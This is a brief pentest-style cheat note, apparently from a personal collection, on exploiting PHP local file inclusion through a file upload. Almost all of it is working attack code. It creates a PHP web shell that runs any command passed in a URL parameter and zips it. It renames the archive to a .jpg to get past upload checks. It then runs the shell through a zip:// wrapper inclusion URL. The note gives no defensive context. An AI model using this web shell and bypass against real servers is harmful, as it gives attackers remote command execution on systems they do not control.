#lfi #file_upload #php
https://www.youtube.com/watch?v=pKzHFx8oSrw 

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
```

```bash
zip payload.zip payload.php
mv payload.zip image.jpg
```

→ Upload file. Then go to:
```
?file=zip://upload/image.jpg%23payload&cmd=ls`
```